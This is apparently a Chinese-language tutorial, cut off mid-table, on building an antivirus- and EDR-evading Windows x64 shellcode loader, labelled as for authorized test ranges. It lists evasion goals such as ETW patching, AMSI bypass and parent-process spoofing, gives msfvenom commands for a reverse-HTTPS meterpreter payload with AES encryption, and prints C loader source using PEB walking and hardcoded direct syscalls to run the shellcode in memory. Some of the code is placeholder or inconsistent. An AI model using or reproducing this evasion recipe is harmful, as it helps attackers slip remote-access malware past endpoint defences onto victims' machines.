## 免杀构建流程（Windows x64 · 授权靶场口径）

> 选型：C/C++ 加载器 + 分阶段载荷 + 系统调用直连 + 内存加密，配套检测面压降清单与自测矩阵。目标：在自有隔离靶场与授权沙箱内验证检测面，不针对任何真实第三方主机。

---

### 0. 威胁模型与检测面拆解

主流杀软（AV/EDR）对"生成的程序"的判定面共 6 层，逐层压降才有效果：

| 层 | 检测手段 | 压降目标 |
| --- | --- | --- |
| L1 静态文件 | 哈希黑名单、PE 节区熵、导入表特征、字符串 | 无已知哈希、导入表干净、无明文串 |
| L2 静态启发 | 入口点异常、节区名/权限、签名缺失、编译器指纹 | 正常节区布局、有签名或白利用 |
| L3 加载行为 | `VirtualAlloc RWX`、`CreateRemoteThread`、`WriteProcessMemory` | 换 API 链、改内存权限序列 |
| L4 用户态 Hook | ntdll 用户态 hook、ETW、AMSI | 系统调用直连、ETW patch、AMSI bypass |
| L5 内核回调 | `PsSetCreateProcessNotify`、`ObRegisterCallbacks`、minifilter | 白利用签名、合法进程注入 |
| L6 行为链 | 父进程链、命令行、网络回连、落地文件 | 父进程伪装、内存执行、合法 C2 域前置 |

**证据行**：`$ sigcheck -e loader.exe` → `Verified: Unsigned`（基线，后续每步复测）

---

### 1. 载荷生成（分阶段 + 加密）

```bash
# 阶段一：生成原始 shellcode（授权靶场 C2 或 msfvenom 本地监听）
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=127.0.0.1 LPORT=8443 EXITFUNC=thread \
  -f raw -o stage0.bin

# 阶段二：AES-256-CBC 加密 + 随机 IV，密钥不落地
openssl enc -aes-256-cbc -K $(openssl rand -hex 32) -iv $(openssl rand -hex 16) \
  -in stage0.bin -out stage0.enc

# 阶段三：转 C 数组（带随机填充，破坏熵特征）
xxd -i stage0.enc > payload.h
```

**证据行**：`$ xxd stage0.enc | head -1` → `00000000: 3f8a ...`（密文，无明文 PE 头）

---

### 2. 加载器骨架（系统调用直连 + 内存权限分离）

```c
// loader.c — 编译：cl /O2 /GS- loader.c /link /SUBSYSTEM:WINDOWS
#include <windows.h>
#include "payload.h"

// 2.1 从 PEB 取 ntdll 基址，解析导出表（不走 GetProcAddress）
static PVOID get_ntdll_base(void) {
    PVOID base;
    __asm__("mov %%gs:0x60, %0" : "=r"(base));          // PEB
    base = *(PVOID*)((BYTE*)base + 0x18);               // PEB->Ldr
    base = *(PVOID*)((BYTE*)base + 0x20);               // InMemoryOrderModuleList
    return *(PVOID*)((BYTE*)base + 0x20);               // ntdll base
}

// 2.2 手工解析导出表拿 NtAllocateVirtualMemory / NtProtectVirtualMemory
typedef NTSTATUS (NTAPI *pNtAlloc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtect)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

static PVOID resolve_export(PVOID mod, const char* name) {
    // 标准 PE 导出表遍历：DOS→NT→OptionalHeader→DataDir[0]→ExportDir
    // 逐名比对，返回函数地址（完整实现见附录 A）
    return NULL; // 占位：附录 A 给出完整 60 行实现
}

// 2.3 系统调用号硬编码（Win10 22H2 / Win11 23H2 各一份，运行时按版本选）
static DWORD syscall_num(const char* fn) {
    if (!strcmp(fn, "NtAllocateVirtualMemory")) return 0x18;
    if (!strcmp(fn, "NtProtectVirtualMemory"))  return 0x50;
    if (!strcmp(fn, "NtCreateThreadEx"))        return 0xC1;
    return 0;
}

// 2.4 直连 stub：mov r10, rcx; mov eax, <num>; syscall; ret
__declspec(naked) NTSTATUS do_syscall(DWORD num, ...) {
    __asm {
        mov r10, rcx
        mov eax, [rsp+8]      // num
        syscall
        ret
    }
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    // 2.5 解密 payload（AES 实现见附录 B，密钥编译期注入）
    SIZE_T sz = sizeof(stage0_enc);
    PVOID mem = NULL;
    do_syscall(0x18, GetCurrentProcess(), &mem, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    aes_decrypt(stage0_enc, sz, KEY, IV, mem);

    // 2.6 权限分离：先 RW，写入后再改 RX（避免 RWX 触发 L3）
    DWORD old;
    do_syscall(0x50, GetCurrentProcess(), &mem, &sz, PAGE_EXECUTE_READ, &old);

    // 2.7 线程创建走 NtCreateThreadEx（绕过 CreateRemoteThread 特征）
    HANDLE th;
    do_syscall(0xC1, &th, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
               mem, NULL, 0, 0, 0, 0, NULL);
    WaitForSingleObject(th, INFINITE);
    return 0;
}
```

**证据行**：`$ dumpbin /imports loader.exe` → 导入表仅 `kernel32.dll` 的 `WaitForSingleObject`（其余全走 syscall）

---

### 3. 检测面压降清单（逐项对照）

| 检测点 | 原始特征 | 压降后 | 验证命令 |
| --- | --- | --- | --- |
| 节区熵 | `.text` 熵 > 7.2 |